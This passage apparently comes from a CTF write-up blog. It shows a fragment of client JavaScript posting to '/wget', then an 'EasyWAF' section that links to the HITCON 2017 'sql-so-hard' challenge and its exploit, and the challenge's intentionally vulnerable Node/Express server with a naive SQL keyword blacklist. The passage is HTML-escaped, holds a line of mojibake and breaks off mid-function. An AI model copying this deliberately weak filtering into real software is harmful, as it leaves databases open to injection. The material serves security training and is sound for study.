&lt;span style="color:#75af00">encryptdata&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">uri&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">$&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/wget&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">encryptdata&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">encryptdata&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">$&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/wget&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easywaf">EasyWAF&lt;/h2>
&lt;blockquote>
&lt;p>different cookie means node pg vuln&lt;/p>
&lt;p>pay attention to the hint different cookie different means&lt;/p>
&lt;/blockquote>
&lt;p>‰ªñÂ¶àÁöÑ ÁªèÂÖ∏ÊØîËµõÁªìÊùüÊâæÂà∞ÂéüÈ¢òÔºåÁúü‰∏ÄÊ®°‰∏ÄÊ†∑ÔºåÂêê‰∫Ü&lt;/p>
&lt;p>&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard">https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py">https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">#!/usr/bin/node
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * @HITCON CTF 2017
&lt;/span>&lt;span style="color:#75715e"> * @Author Orange Tsai
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">qs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;qs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;pg&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">mysql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;mysql&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;crypto&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;express&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createPool&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">connectionLimit&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ban&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ban&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;bandb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">client&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">pg&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Client&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;select&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;union&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;and&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;or&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>
&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;end&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;{&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;show_source&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__filename&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">k&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">k&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT ?,?,?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM blacklists WHERE ip=?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Shame on you&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM blacklists GROUP BY ip`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;text/html&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;pre&amp;gt;Here is the &amp;lt;a href=https://amiaaaz.github.io/?show_source=1&amp;gt;source&amp;lt;/a&amp;gt;, thanks to Orange\n\n&amp;lt;h3&amp;gt;Hall of Shame&amp;lt;/h3&amp;gt;(delete every 60s)\n&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#111">parseInt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">. &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">\n`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/reg&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bye&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
